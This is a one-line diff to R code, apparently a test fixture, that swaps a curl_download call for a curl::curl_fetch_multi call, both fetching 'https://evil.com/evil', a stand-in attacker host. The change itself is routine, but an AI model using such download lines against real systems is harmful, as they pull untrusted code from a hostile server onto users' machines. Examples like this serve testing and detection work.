@@ -1,1 +1,1 @@
-curl_download("https://evil.com/evil", destfile = tempfile())
+curl::curl_fetch_multi("https://evil.com/evil", done = callback)
